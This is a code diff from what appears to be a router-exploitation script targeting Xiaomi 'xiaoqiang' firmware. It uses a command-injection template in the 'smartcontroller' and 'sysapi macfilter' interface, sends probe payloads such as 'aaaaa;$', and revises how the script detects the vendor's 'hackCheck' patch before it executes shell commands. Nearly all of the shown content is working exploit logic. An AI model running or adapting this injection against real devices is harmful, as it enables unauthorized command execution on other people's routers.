@@ -54,7 +54,7 @@ int32_t run_sysapi_macfilter(char* mac, int32_t wan_block)
 """
 vuln_cmd = "/usr/sbin/sysapi macfilter set mac=;; wan=no;/usr/sbin/sysapi macfilter commit"
 max_cmd_len = 100 - 1 - len(vuln_cmd)
-hackCheck = False
+hackCheck = gw.detect_hackCheck()
 
 def exec_smart_cmd(cmd, timeout = 7, api = 'API/xqsmarthome/request_smartcontroller'):
     ######
@@ -220,11 +220,13 @@ def exec_cmd(command, fn = '/tmp/e', run_as_sh = True):
         exec_tiny_cmd(f"sh {fn}")
 
 
+if hackCheck >= 3:
+    raise ExploitFixed(f'Exploits "Smartcontroller" are not usable (hackCheck:{hackCheck})')
+
 # Test smartcontroller interface
 res = get_all_scenes()
 
 # Detect using hackCheck fix
-hackCheck = False
 res = exec_smart_command("aaaaa;$", ignore_err_code = 2)
 if isinstance(res, dict):
     if res['msg'] != 'api not exists':
@@ -232,7 +234,7 @@ if isinstance(res, dict):
 else:
     if 'Internal Server Error' in res:
         print(f'Detect using xiaoqiang "hackCheck" fix ;-)')
-        hackCheck = True
+        #hackCheck = 1
     else:
         raise ExploitNotWorked(f'Smartcontroller return Error: {res}')
 
